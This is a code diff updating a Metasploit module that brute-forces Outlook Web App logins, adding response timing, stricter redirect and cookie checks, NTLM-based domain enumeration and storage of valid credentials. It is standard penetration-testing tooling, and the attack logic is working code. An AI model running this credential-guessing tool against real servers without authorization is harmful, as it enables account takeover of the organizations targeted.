@@ -18,8 +18,7 @@ class Metasploit3 < Msf::Auxiliary
     super(
       'Name'           => 'Outlook Web App (OWA) Brute Force Utility',
       'Description'    => %q{
-        This module tests credentials on OWA 2003, 2007, 2010, 2013 servers. The default
-        action is set to OWA 2010.
+        This module tests credentials on OWA 2003, 2007, 2010, and 2013 servers.
       },
       'Author'         =>
         [
@@ -28,7 +27,8 @@ class Metasploit3 < Msf::Auxiliary
           'SecureState R&D Team',
           'sinn3r',
           'Brandon Knight',
-          'Pete (Bokojan) Arzamendi, #Outlook 2013 updates'
+          'Pete (Bokojan) Arzamendi', # Outlook 2013 updates
+          'Nate Power'                # HTTP timing option
         ],
       'License'        => MSF_LICENSE,
       'Actions'        =>
@@ -70,18 +70,18 @@ class Metasploit3 < Msf::Auxiliary
             }
           ]
         ],
-      'DefaultAction' => 'OWA_2010',
+      'DefaultAction' => 'OWA_2013',
       'DefaultOptions' => {
         'SSL' => true
       }
     )
-
 
     register_options(
       [
         OptInt.new('RPORT', [ true, "The target port", 443]),
         OptAddress.new('RHOST', [ true, "The target address", true]),
         OptBool.new('ENUM_DOMAIN', [ true, "Automatically enumerate AD domain using NTLM authentication", true]),
+        OptBool.new('AUTH_TIME', [ false, "Check HTTP authentication response time", true])
       ], self.class)
 
 
@@ -93,12 +93,7 @@ class Metasploit3 < Msf::Auxiliary
     deregister_options('BLANK_PASSWORDS', 'RHOSTS','PASSWORD','USERNAME')
   end
 
-  def run
-
-    vhost = datastore['VHOST'] || datastore['RHOST']
-
-    print_status("#{msg} Testing version #{action.name}")
-
+  def setup
     # Here's a weird hack to check if each_user_pass is empty or not
     # apparently you cannot do each_user_pass.empty? or even inspect() it
     isempty = true
@@ -106,7 +101,13 @@ class Metasploit3 < Msf::Auxiliary
       isempty = false
       break
     end
-    print_error("No username/password specified") if isempty
+    raise ArgumentError, "No username/password specified" if isempty
+  end
+
+  def run
+    vhost = datastore['VHOST'] || datastore['RHOST']
+
+    print_status("#{msg} Testing version #{action.name}")
 
     auth_path   = action.opts['AuthPath']
     inbox_path  = action.opts['InboxPath']
@@ -126,7 +127,15 @@ class Metasploit3 < Msf::Auxiliary
       each_user_pass do |user, pass|
         next if (user.blank? or pass.blank?)
         vprint_status("#{msg} Trying #{user} : #{pass}")
-        try_user_pass({"user" => user, "domain"=>domain, "pass"=>pass, "auth_path"=>auth_path, "inbox_path"=>inbox_path, "login_check"=>login_check, "vhost"=>vhost})
+        try_user_pass({
+          user: user,
+          domain: domain,
+          pass: pass,
+          auth_path: auth_path,
+          inbox_path: inbox_path,
+          login_check: login_check,
+          vhost: vhost
+        })
       end
     rescue ::Rex::ConnectionError, Errno::ECONNREFUSED
       print_error("#{msg} HTTP Connection Error, Aborting")
@@ -134,13 +143,13 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def try_user_pass(opts)
-    user = opts["user"]
-    pass = opts["pass"]
-    auth_path = opts["auth_path"]
-    inbox_path = opts["inbox_path"]
-    login_check = opts["login_check"]
-    vhost = opts["vhost"]
-    domain = opts["domain"]
+    user = opts[:user]
+    pass = opts[:pass]
+    auth_path = opts[:auth_path]
+    inbox_path = opts[:inbox_path]
+    login_check = opts[:login_check]
+    vhost = opts[:vhost]
+    domain = opts[:domain]
 
     user = domain + '\\' + user if domain
 
@@ -163,6 +172,10 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     begin
+      if datastore['AUTH_TIME']
+        start_time = Time.now
+      end
+
       res = send_request_cgi({
         'encode'   => true,
         'uri'      => auth_path,
@@ -171,6 +184,9 @@ class Metasploit3 < Msf::Auxiliary
         'data'     => data
       })
 
+      if datastore['AUTH_TIME']
+        elapsed_time = Time.now - start_time
+      end
     rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
       print_error("#{msg} HTTP Connection Failed, Aborting")
       return :abort
@@ -186,38 +202,46 @@ class Metasploit3 < Msf::Auxiliary
         return :abort
     end
     if action.name == "OWA_2013"
-      #Check for a response code to make sure login was valid. Changes from 2010 to 2013.
-      #Check if the password needs to be changed.
+      # Check for a response code to make sure login was valid. Changes from 2010 to 2013.
+      # Check if the password needs to be changed.
       if res.headers['location'] =~ /expiredpassword/
-        print_good("#{msg} SUCCESSFUL LOGIN. '#{user}' : '#{pass}': NOTE password change required")
-        report_hash = {
-          :host   => datastore['RHOST'],
-          :port   => datastore['RPORT'],
-          :sname  => 'owa',
-          :user   => user,
-          :pass   => pass,
-          :active => true,
-          :type => 'password'}
-
-        report_auth_info(report_hash)
+        print_good("#{msg} SUCCESSFUL LOGIN. #{elapsed_time} '#{user}' : '#{pass}': NOTE password change required")
+        report_cred(
+          ip: datastore['RHOST'],
+          port: datastore['RPORT'],
+          service_name: 'owa',
+          user: user,
+          password: pass
+        )
         return :next_user
       end
 
-      #No password change required moving on.
-      reason = res.headers['location'].split('reason=')[1]
+      # No password change required moving on.
+      unless location = res.headers['location']
+        print_error("#{msg} No HTTP redirect.  This is not OWA 2013, aborting.")
+        return :abort
+      end
+      reason = location.split('reason=')[1]
       if reason == nil
         headers['Cookie'] = 'PBack=0;' << res.get_cookies
       else
-      #Login didn't work. no point on going on.
-        vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
+      # Login didn't work. no point on going on.
+        vprint_error("#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (HTTP redirect with reason #{reason})")
         return :Skip_pass
       end
     else
-       # these two lines are the authentication info
+       # The authentication info is in the cookies on this response
       cookies = res.get_cookies
-      sessionid = 'sessionid=' << cookies.split('sessionid=')[1].split('; ')[0]
-      cadata = 'cadata=' << cookies.split('cadata=')[1].split('; ')[0]
-      headers['Cookie'] = 'PBack=0; ' << sessionid << '; ' << cadata
+      cookie_header = 'PBack=0'
+      %w(sessionid cadata).each do |necessary_cookie|
+        if cookies =~ /#{necessary_cookie}=([^;]*)/
+          cookie_header << "; #{Regexp.last_match(1)}"
+        else
+          print_error("#{msg} Missing #{necessary_cookie} cookie.  This is not OWA 2010, aborting")
+          return :abort
+        end
+      end
+      headers['Cookie'] = cookie_header
     end
 
     begin
@@ -236,40 +260,36 @@ class Metasploit3 < Msf::Auxiliary
       return :abort
     end
 
-    if res.code == 302
-      vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
+    if res.redirect?
+      vprint_error("#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (response was a #{res.code} redirect)")
       return :skip_pass
     end
 
     if res.body =~ login_check
-      print_good("#{msg} SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")
-
-      report_hash = {
-        :host   => datastore['RHOST'],
-        :port   => datastore['RPORT'],
-        :sname  => 'owa',
-        :user   => user,
-        :pass   => pass,
-        :active => true,
-        :type => 'password'}
-
-      report_auth_info(report_hash)
+      print_good("#{msg} SUCCESSFUL LOGIN. #{elapsed_time} '#{user}' : '#{pass}'")
+      report_cred(
+        ip: datastore['RHOST'],
+        port: datastore['RPORT'],
+        service_name: 'owa',
+        user: user,
+        password: pass
+      )
       return :next_user
     else
-      vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
+      vprint_error("#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (response body did not match)")
       return :skip_pass
     end
   end
 
   def get_ad_domain
-    urls = ["aspnet_client",
-      "Autodiscover",
-      "ecp",
-      "EWS",
-      "Microsoft-Server-ActiveSync",
-      "OAB",
-      "PowerShell",
-      "Rpc"]
+    urls = ['aspnet_client',
+      'Autodiscover',
+      'ecp',
+      'EWS',
+      'Microsoft-Server-ActiveSync',
+      'OAB',
+      'PowerShell',
+      'Rpc']
 
     domain = nil
 
@@ -279,7 +299,7 @@ class Metasploit3 < Msf::Auxiliary
           'encode'   => true,
           'uri'      => "/#{url}",
           'method'   => 'GET',
-          'headers'  =>  {"Authorization" => "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="}
+          'headers'  =>  {'Authorization' => 'NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=='}
         })
       rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
         vprint_error("#{msg} HTTP Connection Failed")
@@ -291,10 +311,10 @@ class Metasploit3 < Msf::Auxiliary
         next
       end
 
-      if res and res.code == 401 and res['WWW-Authenticate'].match(/^NTLM/i)
+      if res && res.code == 401 && res.headers.has_key?('WWW-Authenticate') && res.headers['WWW-Authenticate'].match(/^NTLM/i)
         hash = res['WWW-Authenticate'].split('NTLM ')[1]
         domain = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_name].value().gsub(/\0/,'')
-        print_good("Found target domain: " + domain)
+        print_good("Found target domain: #{domain}")
         return domain
       end
     end
@@ -302,9 +322,34 @@ class Metasploit3 < Msf::Auxiliary
     return domain
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      last_attempted_at: DateTime.now,
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def msg
     "#{vhost}:#{rport} OWA -"
   end
 
 end
-
